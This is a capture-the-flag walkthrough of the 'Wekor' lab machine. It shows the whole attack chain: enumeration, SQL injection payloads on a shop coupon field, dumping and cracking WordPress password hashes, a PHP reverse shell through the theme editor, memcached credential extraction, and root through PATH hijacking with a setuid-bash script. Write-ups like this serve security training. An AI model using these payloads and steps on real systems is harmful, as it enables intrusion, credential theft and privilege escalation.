@@ -1,0 +1,523 @@
+Wekor
+
+
+NMAP RESULTS:
+
+Nmap scan report for wekor.thm (10.10.71.44)
+Host is up, received syn-ack (0.20s latency).
+Scanned at 2021-03-08 01:20:37 EST for 14s
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDn0l/KSmAk6LfT9R73YXvsc6g8qGZvMS+A5lJ19L4G5xbhSpCoEN0kBEZZQfI80sEU7boAfD0/VcdFhURkPxDUdN1wN7a/4alpMMMKf2ey0tpnWTn9nM9JVVI9rloaiD8nIuLesjigq+eEQCaEijfArUtzAJpESwRHrtm2OWTJ+PYNt1NDIbQm1HJHPasD7Im/wW6MF04mB04UrTwhWBHV4lziH7Rk8DYOI1xxfzz7J8bIatuWaRe879XtYA0RgepMzoXKHfLXrOlWJusPtMO2x+ATN2CBEhnNzxiXq+2In/RYMu58uvPBeabSa74BthiucrdJdSwobYVIL27kCt89
+|   256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKJLaFNlUUzaESL+JpUKy/u7jH4OX+57J/GtTCgmoGOg4Fh8mGqS8r5HAgBMg/Bq2i9OHuTMuqazw//oQtRYOhE=
+|   256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvvZ5IaMI7DHXHlMkfmqQeKKGHVMSEYbz0bYhIqPp62
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+| http-robots.txt: 9 disallowed entries 
+| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
+|_/comingreallysoon /interesting
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+lets check the robots.txt file
+
+User-agent: *
+Disallow: /workshop/
+Disallow: /root/
+Disallow: /lol/
+Disallow: /agent/
+Disallow: /feed
+Disallow: /crawler
+Disallow: /boot
+Disallow: /comingreallysoon
+Disallow: /interesting
+
+
+navigating through this page: http://wekor.thm/comingreallysoon/
+
+Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot ! 
+
+as in the room description, vhost enumeration is also included in this box
+so using gobuster we can fuzz the subdomains:
+
+┌──(kali㉿kali)-[~]
+└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://wekor.thm 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:          http://wekor.thm
+[+] Threads:      10
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:   gobuster/3.0.1
+[+] Timeout:      10s
+===============================================================
+2021/03/08 02:03:14 Starting gobuster
+===============================================================
+Found: site.wekor.thm (Status: 200) [Size: 143]
+===============================================================
+2021/03/08 02:04:41 Finished
+===============================================================
+
+WE GOT ONE SUBDOMAIN
+lets edit our 'hosts' file and navigate through this page:
+
+this page says:
+Hi there! Nothing here for now, but there should be an amazing website here in about 2 weeks, SO DON'T FORGET TO COME BACK IN 2 WEEKS! -Jim
+
+hmmm...Jim is a username
+
+using directory bruteforcing this subdomain using gobuster:
+
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://site.wekor.thm/ -w /usr/share/wordlists/dirb/common.txt -t 20                   
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://site.wekor.thm/
+[+] Threads:        20
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/03/08 02:07:41 Starting gobuster
+===============================================================
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/.hta (Status: 403)
+/index.html (Status: 200)
+/server-status (Status: 403)
+/wordpress (Status: 301)
+===============================================================
+2021/03/08 02:08:22 Finished
+===============================================================
+
+WE GET A WORDPRESS SITE!
+lets enumerate this webpage also
+header of this webpage:
+
+
+Wekor's Blog
+
+Just another WordPress site
+
+wekor can also be our another username(like jim)
+on the 'hello world' page , i got a another username 'admin'
+
+again using the gobuster in /wordpress dir:
+
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://site.wekor.thm/wordpress -w /usr/share/wordlists/dirb/common.txt -t 20
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://site.wekor.thm/wordpress
+[+] Threads:        20
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/03/08 02:12:03 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/index.php (Status: 301)
+/wp-admin (Status: 301)
+/wp-content (Status: 301)
+/wp-includes (Status: 301)
+===============================================================
+2021/03/08 02:12:49 Finished
+===============================================================
+
+
+lets use wpscan also for more info:
+
+┌──(kali㉿kali)-[~]
+└─$ wpscan --url site.wekor.thm/wordpress -e vp,vt,cb,u                          
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.15
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://site.wekor.thm/wordpress/ [10.10.176.187]
+[+] Started: Mon Mar  8 05:00:25 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://site.wekor.thm/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] WordPress readme found: http://site.wekor.thm/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://site.wekor.thm/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://site.wekor.thm/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.6 identified (Outdated, released on 2020-12-08).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://site.wekor.thm/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.6</generator>
+ |  - http://site.wekor.thm/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6</generator>
+
+[+] WordPress theme in use: twentytwentyone
+ | Location: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/
+ | Last Updated: 2020-12-22T00:00:00.000Z
+ | Readme: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/readme.txt
+ | [!] The version is out of date, the latest version is 1.1
+ | Style URL: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.0
+ | Style Name: Twenty Twenty-One
+ | Style URI: https://wordpress.org/themes/twentytwentyone/
+ | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: 'Version: 1.0'
+
+[+] Enumerating Vulnerable Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:12 <========================================================================================> (330 / 330) 100.00% Time: 00:00:12
+[+] Checking Theme Versions (via Passive and Aggressive Methods)
+
+[i] No themes Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <===========================================================================================> (22 / 22) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 <==========================================================================================> (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://site.wekor.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Mon Mar  8 05:00:56 2021
+[+] Requests Done: 406
+[+] Cached Requests: 8
+[+] Data Sent: 114.22 KB
+[+] Data Received: 444.107 KB
+[+] Memory used: 246.055 MB
+[+] Elapsed time: 00:00:31
+
+
+we can try each and every vuln which wpscan gives us but , first try the manual way!(in background im bruteforcing the admin password using the wpscan)
+but got nothing
+
+now i again check the webpage available at 'wekor.thm/it-next', but this time i found something
+in the 'it-cart.php' page we have a 'apply coupon' paramater which is vuln to SQli attack, when i put a single quote it says:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
+
+so lets deep down further
+after checking the no.of columns using this query:' union select 1,2,3-- -
+it returns:
+Coupon Code : 1 With ID : 2 And With Expire Date Of : 3 Is Valid!
+
+THIS MEANS THAT THIS TABLE HAS 3 COLUMNS
+after using the query: ' or 1=1-- -'
+
+Coupon Code : 12345 With ID : 1 And With Expire Date Of : doesnotexpire Is Valid!
+it gives me the valid coupon code
+now , using burp suit:
+
+POST /it-next/it_cart.php HTTP/1.1
+Host: wekor.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 110
+Origin: http://wekor.thm
+Connection: close
+Referer: http://wekor.thm/it-next/it_cart.php
+Upgrade-Insecure-Requests: 1
+
+coupon_code='+union+select+1,2,concat(table_name)+from+information_schema.tables--+-&apply_coupon=Apply+Coupon
+
+i got a whole lot of tables in which i found a table name 'wp_users'
+1 With ID : 2 And With Expire Date Of : wp_users Is Valid!
+
+using sqlmap i dump the contents of the database wordpress:
+
+Table: wp_users
+[4 entries]
++------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
+| ID   | user_url                        | user_pass                          | user_email        | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |
++------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
+| 1    | http://site.wekor.thm/wordpress | $P$Bo{REDECATED}. | admin@wekor.thm   | admin      | 0           | admin        | admin         | 2021-01-21 20:33:37 | <blank>                                       |
+| 5743 | http://jeffrey.com              | $P$BU8QpWD{REDECATED} | jeffrey@wekor.thm | wp_jeffrey | 0           | wp jeffrey   | wp_jeffrey    | 2021-01-21 20:34:50 | 1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0 |
+| 5773 | http://yura.com                 | $P$B6jSC3m{REDECATED} | yura@wekor.thm    | wp_yura    | 0           | wp yura      | wp_yura       | 2021-01-21 20:35:27 | <blank>                                       |
+| 5873 | http://eagle.com                | $P${REDACTED} | eagle@wekor.thm   | wp_eagle   | 0           | wp eagle     | wp_eagle      | 2021-01-21 20:36:11 | <blank>                                       |
++------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
+
+using john the ripper:
+
+┌──(kali㉿kali)-[~]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+HIDDEN         (wp_jeffrey)
+HIDDEN           (wp_eagle)
+HIDDEN         (wp_yura)
+3g 0:00:00:00 DONE (2021-03-09 11:12) 4.225g/s 3515p/s 4867c/s 4867C/s batman1..althea
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed
+
+
+geting into the dashboard of the user 'wp_yura', changing the 404.php file with my php reverse shell code
+then navigate through 'http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php'
+
+www-data@osboxes:/home$ ls -la 
+total 28
+drwxr-xr-x  4 root root  4096 Jul 12  2020 .
+drwxr-xr-x 23 root root  4096 Feb  1 13:20 ..
+drwxr-xr-- 18 Orka Orka  4096 Feb  1 13:50 Orka
+drwx------  2 root root 16384 Feb 28  2019 lost+found
+www-data@osboxes:/home$ 
+
+im into the machine
+
+after running linpeas:
+i found some ports which are listening 
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3010          0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
+tcp        0      0 10.10.246.135:41998     10.8.73.218:1234        CLOSE_WAIT  1848/bash       
+
+got some mysql creds:
+
+
+[+] Searching Wordpress wp-config.php files
+wp-config.php files found:
+/var/www/html/site.wekor.thm/wordpress/wp-config.phpdefine( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'root' );
+define( 'DB_PASSWORD', 'HIDDEN' );
+define( 'DB_HOST', 'localhost' );
+
+find nothing in the database
+After searching in Google about the port 11211 we discover that is a memcached server. Some more searches and we got the command to dump the cached data.
+
+www-data@osboxes:/tmp$ /usr/share/memcached/scripts/memcached-tool 
+Usage: memcached-tool <host[:port] | /path/to/socket> [mode]
+
+       memcached-tool 10.0.0.5:11211 display    # shows slabs
+       memcached-tool 10.0.0.5:11211            # same.  (default is display)
+       memcached-tool 10.0.0.5:11211 stats      # shows general stats
+       memcached-tool 10.0.0.5:11211 settings   # shows settings stats
+       memcached-tool 10.0.0.5:11211 sizes      # shows sizes stats
+       memcached-tool 10.0.0.5:11211 dump       # dumps keys and values
+
+WARNING! sizes is a development command.
+As of 1.4 it is still the only command which will lock your memcached instance for some time.
+If you have many millions of stored items, it can become unresponsive for several minutes.
+Run this at your own risk. It is roadmapped to either make this feature optional
+or at least speed it up.
+
+lets check this on port 11211
+
+data@osboxes:/usr/share/memcached/scripts$ ./memcached-tool localhost:11211 dump
+Dumping memcache contents
+  Number of buckets: 1
+  Number of items  : 5
+Dumping bucket 1 - 5 total items
+add email 0 1615306512 14
+Orka@wekor.thm
+add username 0 1615306512 4
+Orka
+add salary 0 1615306512 8
+$100,000
+add password 0 1615306512 15
+HIDDEN (PASSWORD)
+add id 0 1615306512 4
+3476
+
+LETS CHANGE TO Orka USR
+
+www-data@osboxes:/usr/share/memcached/scripts$ su Orka
+Password: 
+Orka@osboxes:/usr/share/memcached/scripts$ 
+
+I GOT THE USER FLAG
+
+now checking for files which can run as sudo:
+Orka@osboxes:~$ sudo -l
+[sudo] password for Orka:  
+Matching Defaults entries for Orka on osboxes:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User Orka may run the following commands on osboxes:
+    (root) /home/Orka/Desktop/bitcoin
+Orka@osboxes:~$ 
+
+AFTER CHECKING THIS FILE , IT IS AND ELF BINARY, SO I DOWNLOAD THIS FILE INTO MY LOCAL MACHINE THEN DECOMPILE IT USING GHIDRA
+Orka@osboxes:~/Desktop$ ls -la
+total 20
+drwxrwxr-x  2 root root 4096 Jan 23 17:45 .
+drwxr-xr-- 18 Orka Orka 4096 Feb  1 13:50 ..
+-rwxr-xr-x  1 root root 7696 Jan 23 15:23 bitcoin
+-rwxr--r--  1 root root  588 Jan 23 14:27 transfer.py
+
+this folder also contain a file name transfer (currently i don't know about this file and its working)
+
+in the decompiled source code of the main funtion of this binary:
+
+undefined4 main(undefined param_1)
+
+{
+  int iVar1;
+  ushort **ppuVar2;
+  int in_GS_OFFSET;
+  char local_88;
+  char local_87 [15];
+  char local_78 [100];
+  int local_14;
+  undefined *local_c;
+  
+  local_c = &param_1;
+  local_14 = *(int *)(in_GS_OFFSET + 0x14);
+  printf("Enter the password : ");
+  gets(local_87);
+  iVar1 = strcmp(local_87,"password");
+  if (iVar1 == 0) {
+    puts("Access Granted...");
+    sleep(1);
+    puts("\t\t\tUser Manual:\t\t\t");
+    puts("Maximum Amount Of BitCoins Possible To Transfer at a time : 9 ");
+    puts("Amounts with more than one number will be stripped off! ");
+    puts("And Lastly, be careful, everything is logged :) ");
+    printf("Amount Of BitCoins : ");
+    __isoc99_scanf(&DAT_0804893b,&local_88);
+    ppuVar2 = __ctype_b_loc();
+    if (((*ppuVar2)[local_88] & 0x800) == 0) {
+      puts("\n Sorry, This is not a valid amount! ");
+    }
+    else {
+      sprintf(local_78,"python /home/Orka/Desktop/transfer.py %c",(int)local_88);
+      system(local_78);
+    }
+  }
+  else {
+    puts("Access Denied... ");
+  }
+  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+
+we can see that it is using 'python' to execute the 'transfer.py' file but it doesn't using the FULL PATH 
+so we can fool the python by making a file name 'python' in the /usr/sbin directory as it has more precedence then /usr/bin
+as we can see in the 'echo $PATH'
+
+Orka@osboxes:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+Orka@osboxes:~$ 
+
+so it will first check this direc. for the python file (as it has writable permissions)
+
+Orka@osboxes:/usr/sbin$ ls -la python 
+-rwxrwxr-x 1 Orka Orka 33 Mar  9 12:37 python
+Orka@osboxes:/usr/sbin$ cat python 
+#!/bin/bash
+
+chmod +s /bin/bash
+
+Orka@osboxes:/usr/sbin$ 
+
+now we should run execute the 'bitcoin' file as root and check the /bin/bash for a sticky bit
+
+Orka@osboxes:/usr/sbin$ sudo -u root /home/Orka/Desktop/bitcoin 
+Enter the password : password
+Access Granted...
+			User Manual:			
+Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
+Amounts with more than one number will be stripped off! 
+And Lastly, be careful, everything is logged :) 
+Amount Of BitCoins : 9
+Orka@osboxes:/usr/sbin$ ls -la /bin/bash 
+-rwsr-sr-x 1 root root 1109564 Jul 12  2019 /bin/bash
+Orka@osboxes:/usr/sbin$ 
+
+YES!!!
+
+Orka@osboxes:/usr/sbin$ /bin/bash -p
+bash-4.3# id
+uid=1001(Orka) gid=1001(Orka) euid=0(root) egid=0(root) groups=0(root),1001(Orka)
+bash-4.3# whoami
+root
+bash-4.3# 
+
+IM ROOT NOW
+GOT THE ROOT FLAG
